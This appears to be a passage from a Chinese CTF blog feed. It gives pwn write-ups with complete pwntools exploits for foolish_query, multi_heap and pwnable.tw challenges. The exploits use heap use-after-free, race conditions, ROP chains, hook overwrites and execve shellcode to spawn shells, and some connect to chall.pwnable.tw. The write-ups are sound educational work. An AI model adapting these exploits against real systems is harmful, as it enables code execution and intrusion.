(0x7ffff7839b78-0x00007ffff7475000)log.success('libcbase = '+hex(libcbase))give_up(0x60,'\x11'*0x60)give_up(0x60,'\x22'*0x60)p.recvuntil('choose:')p.sendline('5')p.recvuntil('choose:')p.sendline('4')give_up(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23))give_up(0x60,'\x00')give_up(0x60,'\x00')one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147]payload = '\x00'*0xb + p64(libcbase+one_gadget[0]) + p64(libcbase+libc.sym['__libc_realloc']+2)give_up(0x60,payload)p.interactive() 0x0A.2020i春秋新春公益_foolish_query思路：智能指针漏洞，且存在后门。 经过amain9和ruan师傅的指点才解出。。。还是太菜了。。。这应该是非预期解。预期解肯定是读flag。。。 exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *path = './foolish_query'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def search(key): p.recvuntil('6. Exit') p.sendline('1') p.recvuntil("Keyword:") p.sendline(key)def not_search(key): p.recvuntil('6. Exit') p.sendline('4') p.recvuntil("Keyword:") p.sendline(key)def feedback(data): p.recvuntil('6. Exit') p.sendline('5') p.recvuntil("You want to feedback huh?") p.sendline(data)search('\x11'*0x8)search('\x11'*0x8)feedback('\x11'*0x10+p64(0x402FC0)+'\x11'*0x10)search('\x11'*0x8)feedback('\x11'*0x200000)p.recvuntil('Prize you a ptr as reward: ')libcbase = int(p.recv(14),16) + (0x00007ffff7475000-0x7ffff6bca010)log.success('libcbase = '+hex(libcbase))search('\x11'*0x8)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]gadget = libcbase + 0x6d29csearch('\x22'*8+p64(gadget)[0:6])search('\x22'*8+p64(gadget)[0:6])feedback(p64(libcbase+one_gadget[1])[0:6])search('\x22'*8+p64(gadget)[0:6])p.interactive() 预期解：UAF中用来U的chunk与我之前的方法不一样，然后触发后门是靠析构函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#coding:utf-8from pwn import *path = './foolish_query'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def search(key): p.recvuntil('6. Exit') p.sendline('1') p.recvuntil("Keyword:") p.sendline(key)def not_search(key): p.recvuntil('6. Exit') p.sendline('4') p.recvuntil("Keyword:") p.sendline(key)def feedback(data): p.recvuntil('6. Exit') p.sendline('5') p.recvuntil("You want to feedback huh?") p.sendline(data)WordQuery_destory1 = 0x40bf00WordQuery_destory2 = 0x40bf50 WordQuery_eval = 0x40bdb0WordQuery_rep = 0x40be08secertQuery = 0x402ea9fake_vtable = p64(WordQuery_destory1)+p64(secertQuery)+p64(WordQuery_eval)+p64(WordQuery_rep)feedback(fake_vtable)p.recvuntil(':')heap = int(p.recvuntil('\n',drop=True),16)log.success('heap = '+hex(heap))vuln_ptr = heap + 0x80 fake_vtable_addr = heap + 0x50log.success('vuln_ptr = '+hex(vuln_ptr))log.success('fake_vtable_addr = '+hex(fake_vtable_addr))search('\x11'*8)search('\x11'*8)payload = p64(fake_vtable_addr)+p64(vuln_ptr+0x18)+p64(0x8)+p64(0xdeadbeef)feedback(payload)search('\x11'*8)p.sendline('./flag\x00')raw_input()search('flag')p.interactive()'''0x43e1b0: 0x000000000000001c 0x00000000000000510x43e1c0: 0x0000000000000000 0x0000000000402ea90x43e1d0: 0x000000000040bdb0 0x000000000040be080x43e1e0: 0x2c77656e61206e00 0x20687369772049200x43e1f0: 0x726f662074616874 0x6520002e756f79200x43e200: 0x726f6d20796c7261 0x00000000000000310x43e210: 0x000000000040bf00 0x0000000000402ea90x43e220: 0x000000000040bdb0 0x000000000040be080x43e230: 0x7372756f79206400 0x00000000000001310x43e240: 0x00007ffff7839b78 0x00007ffff7839b780x43e250: 0x7320657265772075 0x746e65766461206f0x43e260: 0x72002e73756f7275 0x6f206d726f6620650x43e270: 0x6572636e61702066 0x6e616320636974610x43e280: 0x7461687420726563 0x61727563207369200x43e290: 0x6874697720656c62 0x79726567727573200x43e2a0: 0x20726576656e002e 0x77736e61206568740x43e2b0: 0x6220736168207265 0x226f4e22206e65650x43e2c0: 0x6f6f7420726f6620 0x616420796e616d200x43e2d0: 0x2061206e69207379 0x6b2049202c776f720x43e2e0: 0x656e204920776f6e 0x6863206f742064650x43e2f0: 0x6d6f732065676e61 0x002e676e696874650x43e300: 0x0000000000000000 0x00000000000000000x43e310: 0x0000000000000000 0x00000000000000000x43e320: 0x0000000000000000 0x00000000000000000x43e330: 0x0000000000000000 0x00000000000000000x43e340: 0x0000000000000000 0x00000000000000000x43e350: 0x0000000000000000 0x0000000000000000gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x43e1b0 --&gt; 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x46f620 (size : 0x1f9e0) last_remainder: 0x43e230 (size : 0x130) unsortbin: 0x43e230 (size : 0x130)''' 0x0B.2019TokyoWesternsCTF_multi-heap思路：漏洞在COPY功能中的条件竞争，毕竟在线程中看到sleep，八成是竞争了。申请size没有设限制，可以申请0x410然后用脏数据泄露出libcbase，然后用竞争进行write after free，申请到free_hook去。 exp1(较稳定)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8from pwn import *path = './multi_heap'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(which,size,): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('Which: ') p.sendline(which) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Main or Thread? (m/t): ') p.sendline('m')def delete(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def show(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def edit_long(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.sendline(str(content))def edit_char(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil(': ') p.send(str(content))def copy(index1,index2,size): p.recvuntil('choice: ') p.sendline('5') p.recvuntil('index: ') p.sendline(str(index1)) p.recvuntil('index: ') p.sendline(str(index2)) p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Thread process? (y/n): ') p.sendline('y')new('long',0x410)new('char',0x60)delete(0)new('long',0x410)p.recvuntil('choice: ')p.sendline('4')p.recvuntil('Index: ')p.sendline('1')p.recvuntil('Size: ')p.sendline('0')show(1)libcbase = int(p.recvuntil('\n',drop=True),10) - (0x7f8735ed8ca0-0x7f8735aed000)log.success('libcbase = '+hex(libcbase))for i in range(7): new('char',0x60)for i in range(7): delete(2)edit_long(1,1,libcbase+libc.sym['__free_hook']-0x10)copy(1,0,8)delete(0)for i in range(7): new('char',0x60)new('char',0x60) #8edit_char(8,8,'/bin/sh\x00')new('long',0x60) #9edit_long(9,1,libcbase+libc.sym['system'])delete(8)p.interactive() exp2(简，不稳定)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *path = './multi_heap'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(which,size,): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('Which: ') p.sendline(which) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Main or Thread? (m/t): ') p.sendline('m')def delete(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def show(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def edit_long(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.sendline(str(content))def edit_char(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil(': ') p.send(str(content))def copy(index1,index2,size): p.recvuntil('choice: ') p.sendline('5') p.recvuntil('index: ') p.sendline(str(index1)) p.recvuntil('index: ') p.sendline(str(index2)) p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Thread process? (y/n): ') p.sendline('y')new('long',0x410)new('char',0x60)delete(0)new('long',0x410)p.recvuntil('choice: ')p.sendline('4')p.recvuntil('Index: ')p.sendline('1')p.recvuntil('Size: ')p.sendline('0')show(1)libcbase = int(p.recvuntil('\n',drop=True),10) - (0x7f8735ed8ca0-0x7f8735aed000)log.success('libcbase = '+hex(libcbase))edit_long(1,1,libcbase+libc.sym['__free_hook'])copy(1,0,8)delete(0)new('char',0x60) #1edit_char(1,8,'/bin/sh\x00')new('char',0x60) #2edit_char(2,8,p64(libcbase+libc.sym['system']))delete(1)p.interactive() 0x0C.关于C++逆向的心得首先C++最大的特点是类，所以我们看到operator new的时候，就要本能想到他在初始化一个对象，之后肯定会对这个返回的指针进行构造函数的构造流程，然后我们就可以分析其vtable，大致了解这个类的特点和结构体中的重要数据的位置。还需注意对象的每一个位置是否都被使用和初始化了，要留心脏数据。 一般核心逻辑会藏在虚表的函数中，也就是类的私有函数中，逆向时需要有侧重点。 C++中的大部分的输出使用的是cout，如果有puts/write等函数只能说明运气好QAQ，所以劫持虚表以后再想用输出函数来泄露大部分情况下比较难实现，泄露还是主要关注脏数据和程序本身打印的地方。 对vector和string类的构造，析构和一系列的类函数操作要熟悉，若是自己模拟的，则需要多加注意。 和动态调试相结合理解比较快。 常见的漏洞： 类型为string的临时变量赋值给目标string后(shadow copy)，在函数返回时临时变量被析构，导致了UAF。 CAOV，这个其实在ida中可以看出来的比较明显。 vector的浅拷贝，和指针越界访问。 利用方面还是与虚表结合的比较多，但是劫持虚表之后往往只劫持了执行流，很难控制参数，所以one_gadget显的至关重要，要学会用gadget微调栈的技巧。 0x0D.REFhttps://www.slideshare.net/AngelBoy1/pwning-in-c-basic https://xz.aliyun.com/t/4890https://xz.aliyun.com/t/4933https://xz.aliyun.com/t/5149https://xz.aliyun.com/t/5242 [https://medium.com/@nickhuang_1199/%E6%B7%B1%E5%BA%A6%E4%BA%86%E8%A7%A3%E5%9C%A8javascript%E4%B8%AD%E6%B7%BA%E6%8B%B7%E8%B2%9D-shallow-copy-vs-%E6%B7%B1%E5%BA%A6%E6%8B%B7%E8%B2%9D-deep-copy-%E5%BE%97%E9%83%A8%E5%88%86-33fe501871e https://blog.csdn.net/zzwdkxx/article/details/51769595 https://blog.csdn.net/fdsafwagdagadg6576/article/details/51723823 https://r00tk1ts.github.io/2018/11/29/C++%20Primer%20-%20%E6%8B%B7%E8%B4%9D%E6%8E%A7%E5%88%B6/]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>C++学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw游记]]></title>
    <url>%2F2020%2F03%2F10%2Fpwnable.tw%E6%B8%B8%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0.前言pwnable.tw应该是个pwn手应该都知道的刷题网站，是台湾的大佬们开设的，台湾的信息安全技术一直在世界前列，217和hitcon出的题经常被列为经典。花了不少时间来做这里的题，也确实收获了不少东西。感谢大佬们乐于分享的精神，期间很多题也参考了别人的exp。 后面分数较高的题目由于平台规定不放出wp。 1.start思路：基础的汇编和shellcode的应用。 exp如下：123456789101112131415161718192021222324252627282930313233343536#coding:utf-8from pwn import *path = './start'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10000)p.recvuntil('CTF:')payload = 'a'*0x14 + p32(0x08048087)p.send(payload)stack_addr = u32(p.recv(4))log.success('stack_addr = '+hex(stack_addr))shellcode1 = '\x31\xDB\xB2\x3C\xB0\x03\xCD\x80\x83\xC4\x18\xC3'+'\x00'*8shellcode1+= p32(stack_addr-4)p.send(shellcode1)shellcode = "\x31\xDB\xB2\x3C\xB0\x03\xCD\x80\x83\xC4\x18\xC3" shellcode+= "\x31\xc9\x31\xd2\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"shellcode+= "\x00"*13 + p32(stack_addr+8)p.send(shellcode)p.interactive() 2.orw思路：解法如题，因为加了沙箱，过滤了execve，只要用open，read，write读出/home/orw/flag文件即可。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *path = './orw'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10001)shellcode = asm( "push 0x6761;" "push 0x6c662f77;" "push 0x726f2f65;" "push 0x6d6f682f;" "mov ebx,esp;" "mov eax,5;" "int 0x80;" )shellcode+= asm( "mov edx,0x30;" "mov ecx,0x0804A100;" "mov ebx,3;" "mov eax,3;" "int 0x80;" )shellcode+= asm( "mov edx,0x30;" "mov ecx,0x0804A100;" "mov ebx,1;" "mov eax,4;" "int 0x80;" )p.recvuntil(' shellcode:')p.send(shellcode)p.interactive() 3.calc思路：这道题还有难度的，首先逆向上需要看懂，虽然只有一个数字栈，一个符号栈，但是必须要真正的理解他的机制才可以。 难度应该在于正负数据的处理和发现变相的任意地址写 当我们输入+360这种以符号开头的字样时，会将数字栈的a1[0](原本记录的是数字栈中数字的个数)改为符号之后的值，比如+360运算完成后会使a1[0]变为360，原因是+前面没有数字，使数字栈和符号栈的位置错了一位。使我们可以改动到a1[0]这个核心位置。 首先利用这一点可以和printf合作泄露地址，貌似也只有栈地址需要泄露？程序是静态编译，还没开PIE。 之后我们再来想思考如果我们输入+x1+x2形式的数据会怎样处理： 首先我们先处理完第一个数字x1后，这时a2[0]==x1，然后继续处理x2时，处理到下面这一块时： 等价于： 12a2[x1+1]=x2;x1=x1+1; 我们可以发现：x1与x2我们都可以控制，所以a2[x1+1]=x2就等于我们可以向栈上任意地址（通过a2+偏移来寻址）写任意值，于是准备利用rop来getshell，但是在改0时，突然想起程序对数字0进行了过滤，改不了0，所以就gg了。。。 但是最后还有一个地方： 我们处理完刚刚那里之后，在最后，会进行第二个+的操作，操作数当然已经受我们之前的影响被改变了： 123a1[(x1+1)-1] = a1[(x1+1)-1] + a1[x1+1];===&gt;a1[x1] = a1[x1] + x2; 所以，+x1+x2形式的数据，最终被转化为了a1[x1] = a1[x1] + x2。 而a1[x1]我们可以通过先输入+x1来进行泄露，（假设原本值为result），然后计算x2=value-result，第二次输入+x1+x2，最后变为a1[x1] = result+x2 ==&gt; a1[x1] = result+value-result = value ，value可为我们想写入的值。从而变相实现了栈上任意地址写任意值。 还需要注意正负数的转换： 正数变负数：x = -(0x100000000-x) 负数变正数：x = x+0x100000000 题目设计的真的很巧妙精彩。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#coding:utf-8from pwn import *path = './calc'local = 1debug = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10100)def write(offset,value): payload = '+' + str(offset) p.sendline(payload) result = int(p.recvuntil('\n',drop=True),10) if result &lt; 0: result = 0x100000000+result log.success('result = '+hex(result)) diff = value - result if diff &lt; 0: payload = '+' + str(offset) + str(diff) elif diff &gt; 0x7fffffff: payload = '+' + str(offset) + '-' + str(0x100000000-diff) else: payload = '+' + str(offset) + '+' + str(diff) p.sendline(payload) p.recv()int_0x80 = 0x08049a21pop_eax = 0x0805c34bpop_ecx_ebx = 0x080701d1pop_edx = 0x080701aap.recvuntil('ator ===\n')payload = '+360'p.sendline(payload)stack_addr = int(p.recvuntil('\n',drop=True),10)stack_addr = 0x100000000+stack_addrlog.success('stack_addr = '+hex(stack_addr))if debug == 1: gdb.attach(p,''' b *0x08048F3C b *0x08049432 ''')write(361,pop_edx)write(362,0)write(363,pop_eax)write(364,0xb)write(365,pop_ecx_ebx)write(366,0)write(367,stack_addr+4)write(368,int_0x80)write(369,0x6e69622f)write(370,0x68732f)p.sendline('xxrw_is_so_vegetable....')p.interactive() 4.3x17借着这道题好好调一下__libc_csu_fini和__libc_csu_init函数。 首先一个程序的调用流程是： start 调用 __libc__start_main(main, argc, argv, __libc_csu_init, __libc_csu_fini, rtld_fini, stack_end) 在__libc_start_main函数中，按先后顺序分别调用以下三个函数： __libc_csu_init main __libc_csu_fini （并非直接调用，而是先调用了exit函数，在exit里再调用的__libc_csu_fini） main：main函数地址 argc：给main函数传的参数 argv：给main函数传的环境变量 __libc_csu_init：负责main函数的初始化工作 __libc_csu_fini：负责main函数的收尾工作 rtld_fini/_dl_fini：和动态加载有关的收尾工作， rtld是 runtime loader的缩写 stack_end：栈底地址 .init_array和.fini_array两个段需要多加注意。 PS：在64位动态链接的函数中，有时候__libc_csu_init和__libc_csu_fini这两个函数的名字会变成init和fini。 fini函数里也经常为空，并没有下面所展示的这个流程，可能这题是特殊设计的？ __libc_csu_init：核心流程如下： __libc_csu_fini：这个函数的流程如下： 可以看到如果我们可以改到.fini_array[]里函数指针的值，就可以在程序的最后劫持执行流。这也是解这道题的核心思想。 这三个函数分别在__libc_start_main中被调用的位置为，皆为寄存器方式调用： 了解了这些之后，我们可以开始解这道题了 思路：首先，我们要思考如何使任意地址写任意值这个特性得到复用，写一次的话肯定是不太可能拿shell的。所以可以考虑用上面.fini_array里的这个特点来劫持执行流，将.fini_array[1]写为main，将.fini_array[0]写为__libc_csu_fini函数，所以在处理结束位置时，会形成在每一个__libc_csu_fini中先调用一次main再迭代调用自己，从而形成一个无限循环，栈会被不断抬高。 但是这时，我们发现只有在byte为1时，程序才会有读的功能，程序不断循环，每次循环byte都加一，可以利用数据类型的溢出，使(0xFF+1)=&gt;0x0这一点来做到重复写入。 那现在最后一个难点在于怎么拿shell，静态链接的题，除了shellcode和ret2syscall之外，如果没有后门的话，我还真不知道怎么拿shell，一般程序中是没有execve函数的，因为连/bin/sh字符串都搜不到。。。既然确定了rop，那我们就可以选定一个地址来放我们的ropchain。我因为放ropchain的位置选的不对而导致写完以后卡住了，栈迁移不过去。我个人习惯于放到程序末尾分配页的残存位置，例如：程序在0x4ba8d0就结束了，但是因为分页内存机制，0x4ba000到0x4bb000是最后一页，所以0x4ba8d0到0x4bb000之间的地址都是可写可读的（大部分时候都是）。 我习惯于写在那里，但是写完以后导致栈迁移不过去，看了wp之后，感觉栈的迁移还是很巧妙的。利用了破坏函数调用中堆栈平衡的思想。 我们都知道函数调用的平常流程：call xxx ==&gt; 进入xxx函数中 ==&gt; push rbp；。。。。 leave；ret； call xxx == push 返回地址 + jmp xxx。 堆栈平衡的本质是： push 返回地址和ret相互抵消 push rbp 和 leave相互抵消 如果这两对抵消中的任意一对少了一句，堆栈将不再平衡： 如push 返回地址这一句指令没了，那整个调用流程其实就相当于ret这个gadget。 如push rbp这一句指令没了，那在返回时会返回到之前的rbp上去，我们可以伪造这个rbp。 这道题就用的第一个不平衡，间接性的调用了ret这个gadget，配合ropchain的位置，使栈迁移完成。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./3x17')local = 0pdbg.local()pdbg.remote('chall.pwnable.tw',10105)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote')def write(addr,data): p.recvuntil('addr:') p.send(str(addr)) p.recvuntil('data:') p.send(data)fini_array = 0x4b40f0main_addr = 0x401b6d__libc_csu_fini_addr = 0x402960write(fini_array, p64(__libc_csu_fini_addr) + p64(main_addr))syscall = 0x4022b4pop_rdi = 0x401696pop_rsi = 0x406c30pop_rdx = 0x446e35pop_rax = 0x41e4afbss = 0x4b4100leave_ret = 0x401c4bwrite(bss,p64(pop_rdi)+p64(bss+0x100)+p64(pop_rsi))write(bss+0x18,p64(0)+p64(pop_rdx)+p64(0))write(bss+0x30,p64(pop_rax)+p64(59)+p64(syscall))write(bss+0x100,'/bin/sh\x00')#pdbg.bp(0x402988)write(fini_array, p64(leave_ret))p.interactive() 其他解法：参考Kirin师傅：https://www.jianshu.com/p/9af1cce12e92 （强烈推荐看一下，可以学到很多） 这种思路的核心是在__stack_chk_fail函数中劫持程序执行流。 Kirin师傅真的太强了orz，他做题貌似是直接跟进执行流，看哪里可以控制，找到了好几个可以控制的点，解法一的地方就是他直接测出来的，不像我是见到一个记一个，遇到新的没出现过的点就基本gg了，记得printable也是，Kirin师傅的解法是跟到__stack_chk_fail函数里发现里面调用了数个got表函数，所以就可以用劫持got表的方法来进行攻击。 主要步骤分为四步： 改某个got表地址为main函数中部地址（不是main函数开头的地址，这么做的目的一是绕过byte的检测，二是故意使canary出错从而触发__stack_chk_fail，再次进入main函数中部，从而形成无限循环）。 利用无限循环布置好ropchain。 在.fini_array[0]和.fini_array[1]布置好数据。 改上面那个got表地址为__libc_csu_fini地址，从而调用.fini_array[1]，触发ropchain。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn_debug import *pdbg = pwn_debug('./3x17')local = 1pdbg.local()pdbg.remote('chall.pwnable.tw',10105)pdbg.context(os='linux',terminal=['terminator','-x','sh','-c'])pdbg.context.log_level = 'debug'if local == 1: p = pdbg.run('local') libc = pdbg.libc P = pdbg.elfelse: p = pdbg.run('remote')#pdbg.bp([0x0401C29,0x402988])def write(addr,data): p.recvuntil('addr:') p.send(str(addr)) p.recvuntil('data:') p.send(data)fini_array = 0x4b40f0main_addr = 0x401ba3__libc_csu_fini_addr = 0x402960write(fini_array,p64(__libc_csu_fini_addr)+p64(main_addr)) target_plt = 0x4b70c0 write(target_plt,p64(main_addr)) #rop_chainbss = 0x4bac00pop_rdi = 0x401696pop_rax = 0x41e4afpop_rdx_rsi = 0x44a309bin_sh_addr = bss+0x40pop_rsp_ret = 0x0402ba9leave_addr = 0x401c4bsyscall_addr = 0x446e2cwrite(fini_array,p64(bss-8)+p64(leave_addr))write(bss,p64(pop_rdi))write(bss+8,p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))write(bss+0x20,p64(pop_rdx_rsi)+p64(0)+p64(0))write(bss+0x38,p64(syscall_addr)+'/bin/sh\x00')write(target_plt,p64(__libc_csu_fini_addr))p.interactive() 还有一些比较复杂的，和文件结合在一起的，有时间再研究吧。。。进度有点慢了。orz 总结：感觉这题想独立做出来的话，需要对stack pivot有一定程度的理解。 我个人理解的stack pivot的本质是： 原本的栈空间空间不足从而使ropchain无法完全装进去，而存在另外一块地址空间足够且具有可写权限。 所以我们可以把ropchain放到那块地址上，然后利用leave;ret;将栈(rsp指针)迁移到那块地址上面去。栈迁移的基本结构如下： 12rbp =&gt; | next_rbp | | user_gadget | 我们可以看到，迁移rbp是首要任务，如果题目中有pop rbp; ret;这个gadget的话，可以这么布置： 123456 | ... | | ... |;我们可以在溢出点这么布置，然后在执行函数最后自old_rbp =&gt; | 0xdeadbeef | new_rbp =&gt; | 0xdeadbeef |;带的leave;ret;时会跳到pop_rbp这个gadget上，然 |pop_rbp_addr| |ropchain_begin|;后把rbp给pop到new_rbp上去，然后ret就会再执行一 | new_rbp | | ... |;次leave;ret;这时rsp就会迁移到new_rbp上并把它 | leave_addr | ;pop出去，然后再次ret，开始执行ropchain。 | ... | 如果没有这个gadget话，可以这样布置： 1234 | ... | | ... |old_rbp =&gt; | new_rbp | new_rbp =&gt; | 0xdeadbeef | |leave_addr| |ropchain_begin| | ... | | ... | 我们可以看到，其实大多数情况下其实直接布置更加方便。 这道题巧妙的地方在于在__libc_csu_fini函数里调用call [rbp+rbx*8+0]时，rbp正好指向.fini_array[0]，这相当于已经帮我们把rbp迁移到.fini_array上来了，已经脱离了实际的栈，我们只要再将其迁移到ropchain上去即可。 5. dubblesort思路：count没有限制，可以无限制溢出，但是canary的存在使问题变得很麻烦。 小坑： scanf()输入与类型不符的数据时，我们输入的数据将输入失败，且会一直残留在缓冲区。 scanf()输入整数时，可以输入+，-来使输入合法又不会使源地址的数据发生改变。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *path = './dubblesort'local = 0attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10101) libc = ELF('./libc.so.6')#gdb.attach(p)p.recvuntil('name :')p.send('a'*4*6+'\x11')p.recvuntil('\x11')if local == 1: libcbase = u32('\x00'+p.recv(3)) - 0x1b2000else: libcbase = u32('\x00'+p.recv(3)) - 0x1b0000log.success('libcbase = '+hex(libcbase)) p.recvuntil(' what to sort :')p.sendline(str(35))for i in range(24): p.recv() p.sendline('0')p.recv()p.sendline('+')for i in range(7): p.recv() p.sendline(str(0xf0000000))p.recv()p.sendline(str(libcbase+libc.sym['system']))p.recv()p.sendline(str(libcbase+libc.sym['system']+1))p.recv()p.sendline(str(libcbase+libc.search('/bin/sh\x00').next()))sleep(1)if attach == 1: gdb.attach(p)p.interactive() 6.hacknote思路：常规GLibc_Heap题，改写函数指针为system拿shell。 小坑： one_gadget都行不通hhh 因为最后给system传入的参数地址指向其自身，所以我们需要用到一个知识点：https://blog.csdn.net/freedom2028/article/details/7104131 system不一定需要传/bin/sh，也可以传sh（注意：不是/sh，是sh） exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#coding:utf-8from pwn import *path = './hacknote'debug = 0attach = 0local = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = process(path) #,env = &#123;'LD_PRELOAD':'./libc.so.6'&#125;) libc = ELF('./libc.so.6')else: p = remote('chall.pwnable.tw',10102) libc = ELF('./libc.so.6')def new(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.send(content)def delete(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def show(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))new(0x40,'\x11'*0x10)new(0x10,'\x00'*4+'/bin/sh\x00')delete(0)new(0x18,'\x11'*4)show(0)p.recvuntil('\x11'*4)if local == 1 : libcbase = u32(p.recv(4)) - (0xf7f657f0-0xf7db3000)else: libcbase = u32(p.recv(4)) - 0x1b07f0log.success('libcbase = '+hex(libcbase))delete(1)delete(0)if local == 1: one_gadget = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]else: one_gadget = [0x3a819,0x5f065,0x5f066]new(0x8,p32(libcbase+libc.sym['system'])+';sh\x00')#gdb.attach(p,'b *0x0804893d')show(1)if attach == 1: gdb.attach(p)p.interactive() 额外收获与思考：如果我们不知道传sh可以代替/bin/sh的话，这题是不是就没法解了？ 可以参考free的源码看一下下面的exp，来自v501爷爷： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf8from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']local = 1if local: cn = process('./hacknote') bin = ELF('./hacknote') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: cn = remote('chall.pwnable.tw', 